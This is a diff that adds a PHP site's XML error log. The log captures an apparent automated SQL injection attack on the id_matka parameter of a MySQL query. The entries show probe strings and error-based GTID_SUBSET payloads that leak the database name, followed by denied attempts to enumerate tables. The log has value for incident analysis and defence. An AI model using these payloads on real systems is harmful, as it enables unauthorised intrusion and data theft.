@@ -1,0 +1,72 @@
+<errorentry>
+	<datetime>2020-10-22 09:37:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15.,,.(()('"' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:37:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'CBRZTO<'">pRNosb' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'CBRZTO<'">pRNosb' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:38:03</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AND GTID_SUBSET(CONCAT(0x716a716271,(SELECT (ELT(7124=7124,1))),0x716b6b7171),7124)-- bdPQ' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND GTID_SUBSET(CONCAT(0x716a716271,(SELECT (ELT(7124=7124,1))),0x716b6b7171),' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:38:03</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND GTID_SUBSET(CONCAT(0x716a716271,(SELECT (ELT(7124=7124,1))),0x716b6b7171),7124)-- Brmv' AND status=1 ORDER BY id, ## Malformed GTID set specification 'qjqbq1qkkqq'. ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:38:04</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND GTID_SUBSET(CONCAT(0x716a716271,(SELECT REPEAT(0x34,1024)),0x716b6b7171),9250)-- yGhT' AND status=1 ORDER BY id, ## Malformed GTID set specification 'qjqbq444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444'. ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:38:05</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND GTID_SUBSET(CONCAT(0x716a716271,(SELECT REPEAT(0x30,190)),0x716b6b7171),7641)-- eyBn' AND status=1 ORDER BY id, ## Malformed GTID set specification 'qjqbq0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000qkkqq'. ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:38:50</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND GTID_SUBSET(CONCAT(0x716a716271,(MID((DATABASE()),1,190)),0x716b6b7171),5404)-- jdyC' AND status=1 ORDER BY id, ## Malformed GTID set specification 'qjqbq31742514_2qkkqq'. ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:39:09</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND GTID_SUBSET(CONCAT(0x716a716271,(SELECT COUNT(table_name) FROM mysql.innodb_table_stats WHERE database_name IN (0x33313734323531345f32)),0x716b6b7171),8322)-- MTHf' AND status=1 ORDER BY id, ## SELECT command denied to user '31742514_2'@'localhost' for table 'innodb_table_stats' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-10-22 09:39:29</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND GTID_SUBSET(CONCAT(0x716a716271,(SELECT COUNT(table_name) FROM mysql.innodb_table_stats WHERE database_name IN (0x33313734323531345f32)),0x716b6b7171),2050)-- YXBt' AND status=1 ORDER BY id, ## SELECT command denied to user '31742514_2'@'localhost' for table 'innodb_table_stats' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
